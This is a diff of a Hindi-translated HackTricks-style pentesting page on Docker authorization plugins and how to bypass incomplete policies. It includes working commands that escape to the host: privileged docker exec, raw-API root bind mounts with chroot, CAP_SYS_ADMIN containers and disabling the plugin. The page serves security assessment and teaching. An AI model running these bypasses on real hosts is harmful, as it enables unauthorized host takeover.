@@ -1,22 +1,22 @@
-# रनटाइम ऑथराइज़ेशन प्लगइन्स
+# Runtime Authorization Plugins
 
 {{#include ../../../banners/hacktricks-training.md}}
 
-## अवलोकन
+## Overview
 
-रनटाइम authorization plugins एक अतिरिक्त नीति परत हैं जो यह तय करती हैं कि कोई caller किसी दिए गए daemon action को कर सकता है या नहीं. Docker क्लासिक उदाहरण है। डिफ़ॉल्ट रूप से, जो भी Docker daemon से बात कर सकता है उसके पास प्रभावी रूप से उस पर व्यापक नियंत्रण होता है। Authorization plugins उस मॉडल को सीमित करने की कोशिश करते हैं: वे authenticated user और अनुरोधित API operation की जाँच करते हैं, और फिर नीति के अनुसार अनुरोध को अनुमति या अस्वीकार करते हैं।
+Runtime authorization plugins एक अतिरिक्त नीति परत हैं जो तय करती है कि कोई caller किसी दिए गए daemon action को कर सकता है या नहीं। Docker इसका क्लासिक उदाहरण है। डिफ़ॉल्ट रूप से, जो कोई भी Docker daemon से बात कर सकता है, उसके पास प्रभावी रूप से उस पर व्यापक नियंत्रण होता है। Authorization plugins उस मॉडल को संकुचित करने की कोशिश करते हैं — वे authenticated user और requested API operation की जांच करते हैं, फिर policy के अनुसार request को allow या deny करते हैं।
 
-यह विषय अपनी अलग पेज का हकदार है क्योंकि यह exploitation मॉडल बदल देता है जब एक attacker के पास पहले से ही Docker API या `docker` group में किसी user तक पहुँच होती है। ऐसे वातावरण में सवाल अब केवल "can I reach the daemon?" नहीं रह जाता, बल्कि यह भी होता है: "is the daemon fenced by an authorization layer, and if so, can that layer be bypassed through unhandled endpoints, weak JSON parsing, or plugin-management permissions?"
+यह टॉपिक अपना पेज का हकदार है क्योंकि यह exploitation model को बदल देता है जब हमला करने वाले के पास पहले से Docker API या `docker` group का कोई user access है। ऐसे वातावरण में सवाल केवल "क्या मैं daemon तक पहुँच सकता हूँ?" नहीं रहता, बल्कि "क्या daemon किसी authorization layer से fenced है, और अगर हाँ, तो क्या उस layer को unhandled endpoints, कमजोर JSON parsing, या plugin-management permissions के माध्यम से bypass किया जा सकता है?" भी बन जाता है।
 
 ## Operation
 
-जब कोई request Docker daemon तक पहुँचती है, तो authorization subsystem उस request context को एक या अधिक इंस्टॉल किए गए plugins को पास कर सकता है। plugin authenticated user identity, request details, चुने हुए headers, और request या response body के भागों को तब देखता है जब content type उपयुक्त हो। कई plugins को chain किया जा सकता है, और access तभी प्रदान किया जाता है जब सभी plugins अनुरोध की अनुमति दें।
+जब कोई request Docker daemon तक पहुँचती है, authorization subsystem request context को एक या ज़्यादा installed plugins को पास कर सकता है। plugin authenticated user identity, request details, चुने हुए headers, और request या response body के वे हिस्से देखता है जहाँ content type उपयुक्त होता है। Multiple plugins को chained किया जा सकता है, और access तभी granted होता है जब सभी plugins request को allow करें।
 
-यह मॉडल मजबूत लगता है, लेकिन इसकी सुरक्षा पूरी तरह इस बात पर निर्भर करती है कि नीति लेखक ने API को कितनी पूरी तरह समझा था। एक plugin जो `docker run --privileged` को ब्लॉक करता है लेकिन `docker exec` को अनदेखा करता है, top-level `Binds` जैसे alternate JSON keys को मिस करता है, या plugin administration की अनुमति देता है, वह प्रतिबंध का गलत भाव दे सकता है जबकि सीधे privilege-escalation रास्ते खुले ही रह सकते हैं।
+यह मॉडल मजबूत प्रतीत होता है, लेकिन इसकी सुरक्षा पूरी तरह उस पर निर्भर करती है कि policy author ने API को कितनी पूरी तरह समझा। एक plugin जो `docker run --privileged` को block करता है लेकिन `docker exec` को ignore कर देता है, या top-level JSON key जैसे `Binds` को मिस करता है, या plugin administration की अनुमति देता है, एक झूठी प्रतिबंध की भावना पैदा कर सकता है जबकि सीधे privilege-escalation रास्ते खुला छोड़ देता है।
 
 ## Common Plugin Targets
 
-नीतियों की समीक्षा के लिए महत्वपूर्ण क्षेत्र हैं:
+नीति समीक्षा के लिए महत्वपूर्ण क्षेत्र हैं:
 
 - container creation endpoints
 - `HostConfig` fields such as `Binds`, `Mounts`, `Privileged`, `CapAdd`, `PidMode`, and namespace-sharing options
@@ -24,40 +24,40 @@
 - plugin management endpoints
 - any endpoint that can indirectly trigger runtime actions outside the intended policy model
 
-ऐतिहासिक रूप से, Twistlock's `authz` plugin और शैक्षिक उदाहरणों जैसे `authobot` जैसे सरल plugins ने इस मॉडल को पढ़ना आसान बनाया क्योंकि उनके policy फाइल्स और code paths दिखाते थे कि endpoint-to-action mapping वास्तव में कैसे लागू किया गया था। assessment कार्य के लिए, महत्वपूर्ण सबक यह है कि नीति लेखक को केवल सबसे दिखाई देने वाले CLI commands नहीं बल्कि पूरी API surface को समझना चाहिए।
+ऐतिहासिक रूप से, Twistlock के `authz` plugin और शैक्षिक plugins जैसे `authobot` जैसे उदाहरणों ने इस मॉडल का अध्ययन आसान बनाया क्योंकि उनके policy files और code paths दिखाते थे कि endpoint-to-action mapping वास्तव में कैसे लागू किया गया। assessment कार्य में, महत्वपूर्ण सबक यह है कि policy author को केवल सबसे दिखाई देने वाले CLI commands नहीं, बल्कि पूरा API surface समझना चाहिए।
 
-## दुरुपयोग
+## Abuse
 
-पहला लक्ष्य यह सीखना है कि वास्तव में क्या ब्लॉक किया गया है। यदि daemon किसी action को deny करता है, तो error अक्सर leaks the plugin name, जो उपयोग में नियंत्रण की पहचान करने में मदद करता है:
+पहला लक्ष्य यह जानना है कि वास्तव में क्या blocked है। यदि daemon किसी क्रिया को deny करता है, तो त्रुटि अक्सर plugin name को leaks करती है, जो उपयोग में आने वाले control की पहचान करने में मदद करता है:
 ```bash
 docker ps
 docker run --rm -it --privileged ubuntu:24.04 bash
 docker plugin ls
 ```
-यदि आपको व्यापक endpoint profiling की आवश्यकता है, तो `docker_auth_profiler` जैसे टूल उपयोगी होते हैं क्योंकि वे उस बार‑बार दोहराए जाने वाले कार्य को स्वचालित कर देते हैं — यह जांचना कि plugin वास्तविक रूप से किन API routes और JSON structures की अनुमति देता है।
+यदि आपको broader endpoint profiling की आवश्यकता है, तो `docker_auth_profiler` जैसे टूल उपयोगी होते हैं क्योंकि वे अन्यथा बार-बार होने वाले उस काम को ऑटोमेट कर देते हैं — यह चेक करना कि plugin द्वारा वास्तव में कौन से API routes और JSON structures अनुमत हैं।
 
-यदि environment किसी custom plugin का उपयोग करता है और आप API के साथ इंटरैक्ट कर सकते हैं, तो यह गिनें कि किन object fields को वास्तव में फ़िल्टर किया गया है:
+यदि environment कोई custom plugin उपयोग कर रहा है और आप API के साथ interact कर सकते हैं, तो enumerate करें कि वास्तव में कौन से object fields filter किए जा रहे हैं:
 ```bash
 docker version
 docker inspect <container> 2>/dev/null | head
 curl --unix-socket /var/run/docker.sock http:/version
 curl --unix-socket /var/run/docker.sock http:/v1.41/containers/json
 ```
-ये चेक मायने रखते हैं क्योंकि कई authorization failures अवधारणा-विशेष के बजाय फ़ील्ड-विशेष होती हैं। एक plugin CLI पैटर्न को अस्वीकार कर सकता है बिना समतुल्य API संरचना को पूरी तरह ब्लॉक किए।
+ये चेक महत्वपूर्ण हैं क्योंकि कई प्राधिकरण संबंधी विफलताएँ क्षेत्र-विशेष होती हैं न कि अवधारणा-विशेष। एक plugin CLI पैटर्न को अस्वीकार कर सकता है बिना समकक्ष API संरचना को पूरी तरह से ब्लॉक किए।
 
 ### पूरा उदाहरण: `docker exec` कंटेनर निर्माण के बाद विशेषाधिकार जोड़ता है
 
-एक policy जो privileged container creation को ब्लॉक करती है लेकिन unconfined container creation और `docker exec` को अनुमति देती है, फिर भी बाईपास की जा सकती है:
+एक नीति जो privileged कंटेनर निर्माण को ब्लॉक करती है लेकिन unconfined कंटेनर निर्माण और `docker exec` की अनुमति देती है, तब भी बायपास की जा सकती है:
 ```bash
 docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu:24.04 sleep infinity
 docker ps
 docker exec -it --privileged <container_id> bash
 ```
-यदि daemon दूसरे चरण को स्वीकार कर लेता है, तो उपयोगकर्ता ने उस container के भीतर एक privileged interactive process पुनः प्राप्त कर लिया है, जिसे policy author ने constrained माना था।
+यदि daemon दूसरे चरण को स्वीकार कर लेता है, तो उपयोगकर्ता ने उस container के अंदर एक privileged interactive process पुनः प्राप्त कर लिया है जिसे policy author ने constrained माना था।
 
-### Full Example: Bind Mount Through Raw API
+### पूर्ण उदाहरण: Bind Mount Through Raw API
 
-कुछ broken policies केवल एक JSON shape ही inspect करती हैं। यदि root filesystem bind mount को लगातार blocked नहीं किया गया, तो host फिर भी mounted किया जा सकता है:
+कुछ broken policies केवल एक JSON shape ही निरीक्षण करती हैं। यदि root filesystem bind mount लगातार ब्लॉक नहीं किया जाता है, तो host फिर भी mount किया जा सकता है:
 ```bash
 docker version
 curl --unix-socket /var/run/docker.sock \
@@ -67,18 +67,18 @@ http:/v1.41/containers/create
 docker start <container_id>
 docker exec -it <container_id> chroot /host /bin/bash
 ```
-इसी विचार का उपयोग `HostConfig` के अंतर्गत भी दिखाई दे सकता है:
+वही विचार `HostConfig` के अंतर्गत भी प्रकट हो सकता है:
 ```bash
 curl --unix-socket /var/run/docker.sock \
 -H "Content-Type: application/json" \
 -d '{"Image":"ubuntu:24.04","HostConfig":{"Binds":["/:/host"]}}' \
 http:/v1.41/containers/create
 ```
-प्रभाव एक पूर्ण host filesystem escape है। दिलचस्प बात यह है कि यह bypass incomplete policy coverage के कारण होता है, न कि किसी kernel bug के कारण।
+प्रभाव यह है कि पूरा होस्ट फ़ाइलसिस्टम एस्केप हो जाता है। दिलचस्प बात यह है कि यह बायपास kernel बग की बजाय अधूरी नीति कवरेज से आता है।
 
-### पूर्ण उदाहरण: Unchecked Capability Attribute
+### Full Example: Unchecked Capability Attribute
 
-यदि policy किसी capability-related attribute को filter करना भूल जाए, तो attacker एक container बना सकता है जो एक खतरनाक capability को पुनः प्राप्त कर ले:
+यदि नीति capability-संबंधित attribute को फ़िल्टर करना भूल जाती है, तो हमलावर एक container बना सकता है जो एक खतरनाक capability फिर से प्राप्त कर ले:
 ```bash
 curl --unix-socket /var/run/docker.sock \
 -H "Content-Type: application/json" \
@@ -88,22 +88,22 @@ docker start <container_id>
 docker exec -it <container_id> bash
 capsh --print
 ```
-एक बार `CAP_SYS_ADMIN` या इसी तरह मजबूत capability मौजूद होने पर, [capabilities.md](protections/capabilities.md) और [privileged-containers.md](privileged-containers.md) में वर्णित कई breakout techniques तक पहुँच संभव हो जाती है।
+एक बार `CAP_SYS_ADMIN` या एक समान रूप से मजबूत capability मौजूद होने पर, [capabilities.md](protections/capabilities.md) और [privileged-containers.md](privileged-containers.md) में वर्णित कई breakout techniques पहुँच योग्य हो जाते हैं।
 
-### पूर्ण उदाहरण: Plugin को अक्षम करना
+### पूरा उदाहरण: प्लगइन अक्षम करना
 
-यदि plugin-management operations की अनुमति है, तो सबसे साफ़ bypass संभवतः नियंत्रण को पूरी तरह बंद कर देना हो सकता है:
+यदि plugin-management operations की अनुमति है, तो सबसे साफ़ bypass यह हो सकता है कि नियंत्रण को पूरी तरह से बंद कर दिया जाए:
 ```bash
 docker plugin ls
 docker plugin disable <plugin_name>
 docker run --rm -it --privileged -v /:/host ubuntu:24.04 chroot /host /bin/bash
 docker plugin enable <plugin_name>
 ```
-यह control-plane स्तर पर एक policy विफलता है। authorization layer मौजूद है, लेकिन जिस user को यह प्रतिबंधित करने के लिए होना चाहिए था, उसके पास इसे disable करने की अनुमति अभी भी बनी हुई है।
+यह कंट्रोल-प्लेन स्तर पर एक नीति विफलता है। प्राधिकरण परत मौजूद है, लेकिन जिसे यह प्रतिबंधित करना था वह उपयोगकर्ता अभी भी इसे अक्षम करने की अनुमति रखता है।
 
-## जाँच
+## Checks
 
-ये commands इस बात की पहचान करने के लिए हैं कि क्या कोई policy layer मौजूद है और क्या वह पूर्ण है या सतही।
+ये कमांड यह पहचानने के लिए हैं कि क्या कोई नीति परत मौजूद है और क्या वह पूर्ण है या सतही।
 ```bash
 docker plugin ls
 docker info 2>/dev/null | grep -i authorization
@@ -112,15 +112,16 @@ curl --unix-socket /var/run/docker.sock http:/v1.41/plugins 2>/dev/null
 ```
 What is interesting here:
 
-- जिस denial संदेश में plugin का नाम शामिल होता है, वह authorization layer की पुष्टि करता है और अक्सर सटीक implementation का खुलासा कर देता है।
-- Attacker के लिए दिखाई देने वाली plugin सूची यह पता लगाने के लिए पर्याप्त हो सकती है कि disable या reconfigure ऑपरेशंस संभव हैं या नहीं।
-- जो policy केवल स्पष्ट CLI actions को ब्लॉक करती है पर raw API requests को नहीं, उसे bypassable माना जाना चाहिए जब तक कि इसका विपरीत प्रमाणित न हो।
+- Denial messages that include a plugin name confirm an authorization layer and often reveal the exact implementation.
+- A plugin list visible to the attacker may be enough to discover whether disable or reconfigure operations are possible.
+- A policy that blocks only obvious CLI actions but not raw API requests should be treated as bypassable until proven otherwise.
 
 ## Runtime Defaults
 
 | Runtime / platform | Default state | Default behavior | Common manual weakening |
 | --- | --- | --- | --- |
-| Docker Engine | डिफ़ॉल्ट रूप से सक्षम नहीं | Daemon access प्रभावी रूप से all-or-nothing होता है जब तक कि कोई authorization plugin configured न हो | incomplete plugin policy, blacklists instead of allowlists, allowing plugin management, field-level blind spots |
-| Podman | Not a common direct equivalent | Podman typically relies more on Unix permissions, rootless execution, and API exposure decisions than on Docker-style authz plugins | exposing a rootful Podman API broadly, weak socket permissions |
-| containerd / CRI-O | Different control model | These runtimes usually rely on socket permissions, node trust boundaries, and higher-layer orchestrator controls rather than Docker authz plugins | mounting the socket into workloads, weak node-local trust assumptions |
-| Kubernetes | Uses authn/authz at the API-server and kubelet layers, not Docker authz plugins | Cluster RBAC and admission controls are the main policy layer | overbroad RBAC, weak admission policy, exposing kubelet or runtime APIs directly |
+| Docker Engine | डिफ़ॉल्ट रूप से सक्षम नहीं | Daemon access सामान्यतः या-तो-सब-या-कुछ भी नहीं होता है जब तक कोई authorization plugin कॉन्फ़िगर न किया गया हो | incomplete plugin policy, blacklists instead of allowlists, allowing plugin management, field-level blind spots |
+| Podman | प्रचलित सीधे समकक्ष नहीं | Podman आम तौर पर Docker-style authz plugins की तुलना में अधिक Unix permissions, rootless execution, और API exposure निर्णयों पर निर्भर करता है | exposing a rootful Podman API broadly, weak socket permissions |
+| containerd / CRI-O | अलग नियंत्रण मॉडल | ये runtimes आमतौर पर Docker authz plugins की बजाय socket permissions, node trust boundaries, और higher-layer orchestrator controls पर निर्भर करते हैं | mounting the socket into workloads, weak node-local trust assumptions |
+| Kubernetes | API-server और kubelet लेयर्स पर authn/authz का उपयोग, न कि Docker authz plugins | Cluster RBAC और admission controls मुख्य policy लेयर हैं | overbroad RBAC, weak admission policy, exposing kubelet or runtime APIs directly |
+{{#include ../../../banners/hacktricks-training.md}}
